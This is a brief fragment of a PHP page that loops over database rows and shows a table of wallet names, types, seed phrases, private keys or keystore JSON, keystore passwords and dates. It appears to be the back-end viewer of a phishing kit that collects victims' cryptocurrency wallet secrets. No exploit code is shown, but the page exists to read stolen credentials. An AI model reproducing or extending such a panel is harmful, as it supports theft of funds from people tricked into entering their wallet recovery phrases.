...
<?php include "../include/top.php";?>
    ...
    <thead>
        <tr>
            ...
            <th>Wallet</th>
            <th>Type</th>
            <th>Seed Phase/Private Key /Keystore JSON</th>
            <th>Password(Json Keystore)</th>
            <th>Date</th>
   ...
   while($row_data = mysqli_fetch_array($run_data)){
    ...
    $type = $row_data['type'];
    $wallet = $row_data['wallet'];
    $seed = $row_data['seed_phrase'];
